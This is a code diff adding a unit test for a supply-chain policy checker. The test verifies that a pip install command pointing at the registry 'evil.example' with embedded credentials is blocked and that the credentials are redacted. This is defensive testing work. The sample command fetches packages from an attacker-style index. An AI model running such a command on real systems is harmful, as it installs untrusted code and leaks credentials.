@@ -688,6 +688,29 @@ def test_credentialed_registry_url_still_reports_unexpected_host() -> None:
     assert "token" not in str(findings[0].details["command_excerpt"])
 
 
+def test_credentialed_registry_url_with_s_in_authority_is_redacted() -> None:
+    findings = evaluate_supply_chain_policy(
+        command_evidence=(
+            "$ pip install requests==2.32.3 "
+            "--index-url https://svc_user:secret@evil.example/simple\n"
+        ),
+        changed_paths=(),
+        owned_paths=(),
+        policy=_policy("block"),
+    )
+
+    assert [(finding.reason_code, finding.severity) for finding in findings] == [
+        (SUPPLY_CHAIN_UNEXPECTED_REGISTRY_HOST, "blocking"),
+    ]
+    assert findings[0].details["registry_hosts"] == ["evil.example"]
+
+    excerpt = findings[0].details["command_excerpt"]
+    assert "svc_user:secret" not in excerpt
+    assert "svc_user" not in excerpt
+    assert "secret" not in excerpt
+    assert "[redacted]" in excerpt
+
+
 @pytest.mark.unit
 def test_pip_inline_env_registry_urls_report_unexpected_hosts() -> None:
     findings = evaluate_supply_chain_policy(
